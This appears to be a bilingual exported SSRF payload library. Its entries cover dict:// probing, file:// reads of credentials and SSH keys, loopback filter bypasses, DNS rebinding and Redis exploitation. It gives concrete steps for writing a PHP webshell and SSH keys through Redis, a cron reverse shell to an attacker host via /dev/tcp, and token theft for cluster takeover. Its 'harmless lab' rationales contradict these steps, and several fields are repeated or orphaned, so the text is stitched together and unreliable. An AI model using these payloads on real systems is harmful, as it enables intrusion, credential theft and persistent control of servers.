analysis.en: SSRF Gopher TCP Marker Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 向隔离字节记录监听器发送无害文本标记，只证明原始 TCP 可达性，不执行后端命令。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: SSRF Dict 端口边界验证

description.zh: 覆盖 dict:// Scheme 端口边界验证：从端口探测命令回显，到 Redis info/keys 与 Memcached stats 交互，再到 dict 序列写入 Redis WebShell，确认 dict 协议可交互深度。
description.en: Covers port boundary validation for the dict:// scheme: from probe-command echo on ports through Redis info/keys and Memcached stats interaction to writing a Redis webshell via dict sequences, confirming how deep dict-protocol interaction can go.

prerequisites.zh: 确认 SSRF Dict 端口边界验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Dict Port-Boundary Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF Dict 端口边界验证覆盖 dict:// 协议交互场景：针对允许 dict scheme 的注入点，验证服务端能否向指定端口发送协议命令并带回显。验证维度从通用端口探测，到 Redis info/keys、Memcached stats 交互，再到 dict 序列写入 Redis WebShell。
overview.en: SSRF Dict Port-Boundary Validation covers dict:// protocol interaction: for injection points allowing the dict scheme, verify whether the server can send protocol commands to a chosen port and carry the echo back. Verification dimensions span generic port probing, Redis info/keys and Memcached stats interaction, and a dict sequence writing a Redis WebShell.

vulnerability.zh: 根因是 dict scheme 将 URL 路径中的字符串按行发送到目标端口，等价于向内网服务注入协议命令；Redis、Memcached 等未认证服务接受这些命令后，可进一步组合 config set 与 save 把数据落盘为可执行脚本。
vulnerability.en: The root cause is that the dict scheme sends the URL path string line by line to the target port, equivalent to injecting protocol commands into an internal service; unauthenticated services such as Redis and Memcached accept them, and the commands can be chained with config set and save to persist arbitrary content as an executable script.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步向目标端口发送 dict 探测命令，捕获器收到命令行即确认端口边界；第 2 步对回环 6379 发送 info 与 keys，返回 Redis 信息即确认可交互；第 3 步对 11211 发送 stats 验证 Memcached；第 4 步按序执行 set、config set dir/dbfilename、save 序列，Web 根目录出现可解析的 shell.php 即确认写入成功。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 sends a dict probe command to the target port — the catcher receiving the command line confirms the port boundary; step 2 sends info and keys to loopback 6379 — a Redis reply confirms interactive access; step 3 sends stats to 11211 to verify Memcached; step 4 runs the set, config set dir/dbfilename, and save sequence in order — a parseable shell.php appearing in the web root confirms the write. Replace placeholders via the global variables menu.

mitigation.zh: 获取器拒绝 dict 等非业务协议并阻断内网端口访问；Redis 启用认证、ACL 并用 rename-command 禁用 CONFIG/SAVE，Memcached 限制监听范围。修复后用第 2、4 步样例回归，协议命令应被拒绝且不再有任何文件落盘。
mitigation.en: Reject dict and other non-business schemes in the fetcher and block internal port access; enable Redis authentication and ACLs, disable CONFIG/SAVE via rename-command, and constrain the Memcached listen scope. After the fix, regress with the step 2 and step 4 samples: protocol commands must be denied and no files written.

title.zh: dict 模板探测目标端口
title.en: Probe target ports with the dict template

description.zh: 提交 dict://{TARGET}:{TARGET_PORT}/{COMMAND}；返回非超时响应或服务 banner 即确认端口存活且 dict 协议可用。
description.en: Submit dict://{TARGET}:{TARGET_PORT}/{COMMAND}; a non-timeout response or service banner confirms the port is alive and the dict scheme works.

title.zh: 指令编码绕过关键字过滤

description.zh: 若 set 等关键字被拦截，将指令改为 %73%65%74 等十六进制编码重放；Redis 仍执行写入即过滤可被编码差异绕过。
description.en: If keywords like set are blocked, replay the command hex-encoded as %73%65%74; Redis still performing the write shows the filter falls to encoding differences.

title.zh: 枚举 Redis 与 Memcached 状态

description.zh: 提交 dict://127.0.0.1:6379/info 与 dict://127.0.0.1:11211/stats；info 返回版本与持久化配置、stats 返回键统计，据此规划利用方式。
description.en: Submit dict://127.0.0.1:6379/info and dict://127.0.0.1:11211/stats; version and persistence settings from info plus key statistics from stats shape the exploitation plan.

title.zh: 写入 Webshell 夺取权限
title.en: Plant a webshell to seize control

description.zh: 提交 set 写入 PHP 一句话木马键值并配合落盘到 Web 目录；shell 文件可访问且回连成功即拿下服务器执行权限。
description.en: Submit a set writing the PHP one-liner webshell and land it in the web root; an accessible shell that calls back seizes code execution on the server.

analysis.zh: SSRF Dict 端口边界验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Dict Port-Boundary Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用隔离监听器确认 dict scheme 和目标端口是否可达，不把服务横幅或错误解释为命令执行。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: SSRF File Scheme 沙箱读取

description.zh: 覆盖 file:// Scheme 的本地文件读取验证：从 Linux 与 Windows 敏感文件，到 Web 配置与云环境凭据文件，再到 SSH 私钥读取，并附大小写混合变体，用于确认文件 Scheme 的暴露范围。
description.en: Covers local file read validation for the file:// scheme: from Linux and Windows sensitive files through web configuration and cloud credential files to SSH private-key reads, with case-mixing variants, confirming the exposure range of the file scheme.

prerequisites.zh: 确认 SSRF File Scheme 沙箱读取 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF File-Scheme Sandbox Read are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF File Scheme 沙箱读取覆盖本地文件读取场景：针对支持 file:// 的取回功能，验证文件 scheme 能否越过网络取回边界。验证维度按 Linux 与 Windows 敏感文件、Web 应用配置、云环境凭据与 SSH 私钥五组路径展开，并附大小写混合变体。
overview.en: SSRF File-Scheme Sandbox Read covers local file reading: for fetch functions supporting file://, verify whether the file scheme crosses the network-fetch boundary. Verification dimensions unfold across five path groups — Linux and Windows sensitive files, web application configs, cloud credential files, and SSH keys — with mixed-case variants included.

vulnerability.zh: 根因是 URL 获取器未限制 scheme，file 协议绕过网络边界直接交由本地文件系统处理器承接，可读范围取决于应用进程权限；/etc/passwd、win.ini、.env、云平台凭据与 SSH 私钥等高价值文件因此全部进入暴露面。
vulnerability.en: The root cause is an unrestricted scheme in the URL fetcher: file bypasses the network boundary and is handled directly by the local filesystem processor, with readable scope bounded only by the application process's privileges; high-value files such as /etc/passwd, win.ini, .env, cloud credentials, and SSH private keys therefore all enter the exposure surface.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步读取 Linux 侧 /etc/passwd、/proc/self/environ 等文件，返回内容即确认 file 可读；第 2 步读取 Windows 侧 win.ini 与 SAM；第 3 步读取 config.php、.env 获取数据库连接串与应用密钥；第 4 步读取 Kubernetes serviceaccount token 与 AWS credentials；第 5 步读取 SSH 私钥，出现 OPENSSH PRIVATE KEY 即确认可窃取。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 reads Linux-side files such as /etc/passwd and /proc/self/environ — returned content confirms file reads; step 2 reads Windows-side win.ini and the SAM hive; step 3 reads config.php and .env for database connection strings and app secrets; step 4 reads the Kubernetes serviceaccount token and AWS credentials; step 5 reads SSH private keys — OPENSSH PRIVATE KEY content confirms theft. Replace placeholders via the global variables menu.

mitigation.zh: 获取器只允许 http/https 并显式拒绝 file 协议，文件功能改用对象 ID 与固定根目录定位；按最小权限运行应用进程，并把网络获取与本地文件读取拆分到不同服务身份。修复后用第 1 步样例回归，file URI 应在入口即被拒绝。
mitigation.en: Allow only http/https in the fetcher and explicitly reject the file protocol; locate file functionality by object ID within a fixed root; run the application process with least privilege and split network fetching from local file reads into separate service identities. After the fix, regress with the step 1 sample: file URIs must be rejected at the entrance.

title.zh: 读取系统账户文件

description.zh: 提交 file:///etc/passwd 与 file:///c:/windows/win.ini；响应回显账户列表或 ini 段落即确认 file 协议可用且跨平台可读。
description.en: Submit file:///etc/passwd and file:///c:/windows/win.ini; echoed account lists or ini sections confirm the file scheme works across platforms.

title.zh: 大小写变形绕过过滤

description.zh: 若 file scheme 被拦截，改用 FILE:///ETC/PASSWD 等大小写变体重放；仍返回文件内容即表明过滤未做归一化处理。
description.en: If the file scheme is blocked, replay with case variants like FILE:///ETC/PASSWD; file content still returned shows no normalization is applied.

title.zh: 读取应用配置拿数据库口令
title.en: Read app configs for database secrets

description.zh: 用 file:///var/www/html/config.php 读取应用配置；内容中出现数据库连接串或 API 密钥即获得内网数据库的直连凭据。
description.en: Read file:///var/www/html/config.php; a database connection string or API key inside yields direct credentials for the internal database.

title.zh: 窃取 K8s 服务账号令牌
title.en: Steal the Kubernetes service account token

description.zh: 读取 file:///var/run/secrets/kubernetes.io/serviceaccount/token；拿到 JWT 令牌即可调用 API Server，进而接管容器集群资源。
description.en: Read file:///var/run/secrets/kubernetes.io/serviceaccount/token; the JWT lets you call the API Server and take over cluster resources.

title.zh: 窃取 SSH 私钥横向登录
title.en: Lift SSH keys for lateral login

description.zh: 读取 file:///home/user/.ssh/id_rsa；保存私钥后直连目标主机，并尝试同网段密钥复用完成横向移动。
description.en: Read file:///home/user/.ssh/id_rsa; save the key, SSH into the host directly, and try key reuse across the segment for lateral movement.

analysis.zh: SSRF File Scheme 沙箱读取只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF File-Scheme Sandbox Read is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 只读取专用沙箱中的固定标记文件，验证 file scheme 是否越过应用允许的网络取回边界。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: SSRF 地址规范化回归

description.zh: 覆盖 SSRF 过滤的地址规范化缺口验证：从八进制/整数/十六进制 IP 变体与 IPv6 回环，到 URL 解析歧义与开放重定向链，再到通配 DNS 与编码/CRLF 变体，逐项确认过滤绕过是否成立。
description.en: Covers address-normalization gap validation for SSRF filters: from octal/integer/hex IP variants and IPv6 loopbacks through URL parsing ambiguity and open-redirect chains to wildcard DNS and encoding/CRLF variants, confirming item by item whether filter bypasses hold.

subCategory.zh: 地址变形与 DNS 解析绕过

prerequisites.zh: 确认 SSRF 地址规范化回归 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Address Canonicalization Regression are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF 地址规范化回归覆盖过滤绕过场景：针对带黑名单或白名单校验的取回功能，验证等价地址表示能否绕过检查命中回环。验证维度涵盖八进制/整数/十六进制与缩写 IP、IPv6 回环、URL 解析歧义、开放重定向、通配 DNS 与编码/CRLF 变体六组。
overview.en: SSRF Address Canonicalization Regression covers filter-bypass scenarios: for fetch functions with blacklist or whitelist checks, verify whether equivalent address representations slip past validation to reach loopback. Verification dimensions span six groups — octal/integer/hex and abbreviated IPs, IPv6 loopback, URL parsing ambiguities, open redirects, wildcard DNS, and encoding/CRLF variants.

vulnerability.zh: 根因是校验器按原始字符串匹配而连接库按标准解析连接，两套规则不一致导致 0177.0.0.1、2130706433、[::1] 等等价表示与通配 DNS、重定向链都能落在被禁地址上；百分号编码与 CRLF 注入还会进一步改变解析结果。
vulnerability.en: The root cause is a mismatch between a validator matching raw strings and a connection library resolving per the standard: equivalent forms such as 0177.0.0.1, 2130706433, and [::1], plus wildcard DNS and redirect chains, all land on forbidden addresses; percent-encoding and CRLF injection further alter the parse.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步逐条提交八进制、整数、十六进制与 127.0.0.1.nip.io 变体，标准 127.0.0.1 被拦而某变体返回回环内容即确认缺口；第 2 步用 #@、\@ 等歧义 URL 观察请求落点；第 3 步经开放重定向跳回环；第 4 步用 sslip.io 验证主机名白名单绕过；第 5、6 步覆盖 IPv6 与百分号编码、空字节、CRLF 变体。命中拦截时查看 wafBypass。
exploitation.en: Use in Payload list order: step 1 submits octal, integer, hex, and 127.0.0.1.nip.io variants one by one — the canonical 127.0.0.1 blocked while a variant returns loopback content confirms the gap; step 2 observes request landing points with ambiguous URLs using #@ and \@; step 3 hops to loopback through an open redirect; step 4 proves hostname-allowlist bypass with sslip.io; steps 5 and 6 cover IPv6 plus percent-encoding, null-byte, and CRLF variants. On blocks, consult wafBypass.

mitigation.zh: 使用单一标准 URL 解析器，对解析后的全部地址做二进制分类并阻断回环、私网与保留段，拒绝 userinfo/fragment 混淆与非规范 IP 字面量；在重定向与每次 DNS 解析后复检。修复后用第 1、5 步样例回归，所有等价表示都应被统一拒绝。
mitigation.en: Use a single standard URL parser, classify all resolved addresses in binary form, block loopback, private, and reserved ranges, and reject userinfo/fragment confusion and non-canonical IP literals; recheck after redirects and every DNS resolution. After the fix, regress with the step 1 and step 5 samples: all equivalent forms must be uniformly denied.

title.zh: 进制变形绕过回环黑名单
title.en: Bypass loopback blacklists with radix variants

description.zh: 提交 http://0177.0.0.1 等八进制、十进制、十六进制回环写法；任一变形返回内网内容即黑名单按字面匹配、可被绕过。
description.en: Submit octal, decimal and hexadecimal loopback spellings such as http://0177.0.0.1; any variant returning intranet content shows the blacklist matches literals and can be bypassed.

title.zh: 组合进制与补零变体

description.zh: 继续尝试 0x7f.0.0.1、0177.0.0.1、127.000.000.001 等混合写法；命中与 127.0.0.1 相同的响应即锁定最稳定的绕过形式备用。
description.en: Keep trying mixed forms like 0x7f.0.0.1, 0177.0.0.1 and 127.000.000.001; one matching the 127.0.0.1 response is the most reliable bypass to reuse.

title.zh: 构造 URL 解析混淆

description.zh: 提交含 @ 与片段的 http://{LAB_OAST}#@127.0.0.1/ 类地址；服务端实际请求回环而 OAST 无命中即解析器分歧被利用。
description.en: Submit @-and-fragment URLs like http://{LAB_OAST}#@127.0.0.1/; the server fetching loopback while OAST stays silent means parser divergence is exploited.

title.zh: 重定向与通配 DNS 回访内网
title.en: Re-enter via redirect and wildcard DNS

description.zh: 提交指向己方的 redirect?url=http://127.0.0.1 跳转地址，或 127.0.0.1.sslip.io 通配域名；服务端跟随跳转并返回内网内容即绕过成功。
description.en: Submit an attacker-owned redirect?url=http://127.0.0.1 URL or the 127.0.0.1.sslip.io wildcard domain; the server following the redirect and returning intranet content confirms the bypass.

title.zh: IPv6 与百分号编码收尾
title.en: Finish with IPv6 and percent encoding

description.zh: 提交 http://[::1] 与 http://%31%32%37%2e%30%2e%30%2e%31；返回与回环一致的内容即补齐绕过矩阵，后续统一换用可达变形。
description.en: Submit http://[::1] and http://%31%32%37%2e%30%2e%30%2e%31; responses matching loopback complete the bypass matrix for later reuse.

A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 对等价地址、用户信息、IPv6 和重定向执行统一解析后分类，不维护可直接用于真实内网的绕过清单。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: SSRF DNS 重解析固定验证

description.zh: 覆盖 DNS 重绑定攻击的 TOCTOU 窗口验证：从重绑定域名两次解析结果对照，到公共重绑定与通配域名投递，再到自建交替解析器复现，用于确认服务端是否固定首次解析结果。
description.en: Covers TOCTOU window validation for DNS rebinding attacks: from first-versus-second resolution comparison of rebinding domains through delivery of public rebinding and wildcard domains to reproduction with a self-run alternating resolver, confirming whether the server pins the first resolution.

subCategory.zh: 地址变形与 DNS 解析绕过

prerequisites.zh: 确认 SSRF DNS 重解析固定验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF DNS Re-Resolution Pinning Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF DNS 重解析固定验证覆盖 DNS 重绑定 TOCTOU 场景：针对先解析校验、后连接的服务端取回功能，验证两次 DNS 解析结果不一致时的防护缺口。验证维度包含重绑定域名双次解析对照、公共重绑定域名投递与自建交替解析器复现。
overview.en: SSRF DNS Re-Resolution Pinning Validation covers the DNS rebinding TOCTOU scenario: for server-side fetchers that resolve-validate first and connect later, verify the protection gap when two DNS resolutions disagree. Verification dimensions include paired-resolution comparison on a rebinding domain, public rebinding service delivery, and reproduction with a self-hosted alternating resolver.

vulnerability.zh: 根因是应用只在首次解析后校验地址，连接或重试时重新解析却不固定结果；攻击者用交替返回外部与内网地址的权威 DNS 制造检查时与使用时差异，使校验通过的域名最终连入回环或私网目标。
vulnerability.en: The root cause is an application that validates only after the first resolution but re-resolves on connect or retry without pinning the result; an authoritative DNS alternating between external and internal answers creates a check-time versus use-time divergence, steering an approved hostname into loopback or private targets.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用重绑定域名发起 SSRF，首次返回合法地址、二次解析为内网地址且取回成功即确认窗口存在；第 2 步用 7f000001.cip.cc 与 nip.io 等公共域名复测 TOCTOU 缺口；第 3 步运行自建交替解析器，用其域名复现奇偶交替返回；第 4 步固定 DNS 与网络环境后复测，两次结果不一致即确认服务端未固定解析。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 launches SSRF with the rebinding domain — a legitimate first answer, an internal address on the second, and a successful fetch confirm the window; step 2 retests the TOCTOU gap with public domains such as 7f000001.cip.cc and nip.io; step 3 runs the self-hosted alternating resolver and reproduces odd/even alternation through its domain; step 4 retests with DNS and network pinned — mismatched results confirm the server never pinned the resolution. Replace placeholders via the global variables menu.

mitigation.zh: 校验并固定解析后的允许地址，连接时使用固定 IP 并保持正确 Host/SNI；重定向、重试与 DNS 刷新后重新执行完整地址分类，必要时限制解析缓存 TTL。修复后用第 1 步样例回归，两次解析不一致时连接应被直接拒绝。
mitigation.en: Validate and pin the approved resolved address, connect to the fixed IP with correct Host/SNI, and re-run full address classification after redirects, retries, and DNS refreshes, capping resolver cache TTL where needed. After the fix, regress with the step 1 sample: connections must be denied when the two resolutions disagree.

title.zh: 验证重解析域名行为

description.zh: 提交 http://{LAB_REBIND_DOMAIN}/；域名首次解析到攻击者 IP、再次解析到内网地址，且响应携带内网内容即重解析生效。
description.en: Submit http://{LAB_REBIND_DOMAIN}/; the domain resolving to the attacker IP first and an internal IP second, with intranet content returned, confirms rebinding works.

title.zh: 自建权威 DNS 控制解析
title.en: Run an authoritative DNS to steer resolution

description.zh: 运行 dnslib 脚本架设权威 DNS，对同一域名交替应答两个地址并压低 TTL；目标两次请求落到不同 IP 即掌控翻转节奏。
description.en: Run the dnslib script to host an authoritative DNS that alternates answers with low TTL; the target landing on different IPs per request means you control the flip timing.

title.zh: 通配域名先行验证

description.zh: 用 7f000001.cip.cc、127.0.0.1.nip.io 等编码域名先行测试；域名解析到回环且内容可读即可立即推进内网探测，无需等待自建 DNS。
description.en: Test with encoded domains like 7f000001.cip.cc and 127.0.0.1.nip.io first; loopback resolution with readable content lets intranet probing start before your own DNS is ready.

title.zh: 批量打击内网目标

description.zh: 固定应答序列与 TTL 后，把第 1 步载荷换为自建域名指向不同内网地址逐台打击；稳定返回各目标内容即重绑定通道规模化。
description.en: With the answer sequence and TTL fixed, repoint the step-1 payload's domain at different internal hosts one by one; steady content from each target scales the rebinding channel.

analysis.zh: SSRF DNS 重解析固定验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF DNS Re-Resolution Pinning Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在双端均受控的重绑定夹具中比较校验和连接时的 DNS 答案，验证地址是否固定并重新分类。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: SSRF Redis 可达性验证与保留持久化样例
name.en: SSRF Redis Reachability Validation and Retained Persistence Samples

description.zh: 覆盖 SSRF 打击内网 Redis 全链验证：从 dict/gopher 双通道可达性确认，到写入 WebShell、SSH 公钥与 Cron 反弹任务，再到 rogue server 主从模块加载，确认 Redis 暴露完整影响面。
description.en: Covers end-to-end validation of SSRF against intranet Redis: from dict/gopher dual-channel reachability confirmation through webshell, SSH public-key, and cron reverse-shell writes to rogue-server replication module loading, confirming the full impact of an exposed Redis.

prerequisites.zh: 确认 SSRF Redis PING 可达性验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Redis PING Reachability Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF Redis 可达性验证覆盖内网 Redis 全链路利用场景：针对可经 dict/gopher 触达 6379 端口的注入点，验证从协议可达确认到持久化落地的完整影响面。验证维度包含双通道可达性、WebShell/SSH 公钥/Cron 三种写入与 rogue server 主从模块加载。
overview.en: SSRF Redis Reachability Validation covers the full intranet-Redis exploitation chain: for injection points that can reach port 6379 via dict/gopher, verify the complete impact from protocol reachability to persistence. Verification dimensions include dual-channel reachability, three write primitives (WebShell, SSH public key, cron job), and rogue-server replica module loading.

vulnerability.zh: 根因是 Redis 绑定内网且未启用认证，SSRF 获取器允许 dict/gopher 直连 6379；Redis 接受 SET 与 CONFIG SET dir/dbfilename 组合后可把任意内容写盘，配合 SAVE 即落为 WebShell、authorized_keys 或 cron 任务，rogue 主从链路还能加载恶意模块。
vulnerability.en: The root cause is intranet-bound Redis running without authentication while the SSRF fetcher permits dict/gopher direct access to 6379; Redis accepts SET plus CONFIG SET dir/dbfilename, so arbitrary content is written to disk and, with SAVE, lands as a WebShell, authorized_keys, or a cron job, while the rogue replica chain can even load malicious modules.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 dict info 与 gopher PING 确认 Redis 可达；第 2 步按 set、config set dir/dbfilename、save 序列写 WebShell 并访问验证解析；第 3 步改写 authorized_keys 后用对应私钥登录 root；第 4 步写入 cron 任务等待反弹连接到达监听端口；第 5 步运行 rogue server，MODULE LOAD 日志与主从同步完成即确认加载链。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 confirms Redis reachability with dict info and a gopher PING; step 2 writes a WebShell via the set, config set dir/dbfilename, and save sequence and verifies it parses; step 3 rewrites authorized_keys and logs in as root with the matching key; step 4 plants a cron job and waits for the reverse connection at your listener; step 5 runs the rogue server — MODULE LOAD logs plus completed replica sync confirm the loading chain. Replace placeholders via the global variables menu.

mitigation.zh: 获取器拒绝非 HTTP 协议并在解析后阻断内网目标；Redis 启用认证、TLS 与 ACL，用 rename-command 禁用 CONFIG/SAVE 危险组合，持久化目录不与 Web 根、SSH、cron 目录共享。修复后用第 1 步回归确认协议不可达，三类写入序列全部失败。
mitigation.en: Reject non-HTTP schemes in the fetcher and block intranet targets after resolution; enable Redis authentication, TLS, and ACLs, disable the CONFIG/SAVE combination via rename-command, and keep the persistence directory disjoint from the web root, SSH, and cron directories. After the fix, regress with the step 1 sample for protocol isolation; all three write sequences must fail.

title.zh: 确认 Redis 未授权可达

description.zh: 提交 dict://127.0.0.1:6379/info；返回版本、内存与持久化配置即确认未授权访问，同时记录 dir 与 dbfilename 供落盘定位。
description.en: Submit dict://127.0.0.1:6379/info; version, memory and persistence details confirm unauthenticated access, and dir/dbfilename values locate the landing path.

title.zh: gopher 通道复核连通

description.zh: 用 gopher 提交 PING 报文复核通道；返回 +PONG 即 dict 与 gopher 双通道可用，后续写入任选编码方式。
description.en: Resubmit a PING via gopher; a +PONG reply means both dict and gopher channels work and later writes can pick either encoding.

title.zh: 写入 Webshell 控制 Web 目录
title.en: Plant a webshell in the web root

description.zh: 提交 set 写入 PHP 一句话木马并配置落盘为 Web 目录下 shell.php；文件可访问且能执行命令即获得 WebShell 入口。
description.en: Submit a set writing the PHP one-liner and land it as shell.php under the web root; an accessible, command-executing file is the webshell foothold.

title.zh: 写入 SSH 公钥建立持久入口
title.en: Install an SSH key for persistence

description.zh: 将公钥内容作为键值写入并落盘到 authorized_keys 对应路径；随后 ssh 免密登录即获得系统层稳定入口。
description.en: Write the public key as a value and land it on the authorized_keys path; passwordless SSH afterwards is a durable system-level entry.

title.zh: 计划任务反弹拿系统权限
title.en: Catch a system shell via cron

description.zh: 写入 */1 * * * * bash -i >& /dev/tcp/攻击机/端口 的计划任务键值并落盘 crontab；监听端收到 shell 即完成持久化控制。
description.en: Write the */1 * * * * bash reverse line as a value and land it in crontab; a shell on the listener completes persistent control of the host.

analysis.zh: SSRF Redis PING 可达性验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Redis PING Reachability Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 仅向隔离 Redis 夹具发送 PING 帧，确认协议可达性，不写键、不改配置也不触发持久化。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 操作系统命令注入无害标记

description.zh: 覆盖操作系统命令注入的探测与利用：从基础注入点探测与 Linux/Windows 命令拼接，到时间盲注延时确认，再到外带数据回传，并附空格、关键字与编码绕过变体。
description.en: Covers probing and exploitation of OS command injection: from basic injection-point detection and Linux/Windows command chaining through time-based blind confirmation to out-of-band data exfiltration, with space, keyword, and encoding bypass variants.

prerequisites.zh: 确认 操作系统命令注入无害标记 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for OS Command Injection Harmless Marker are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

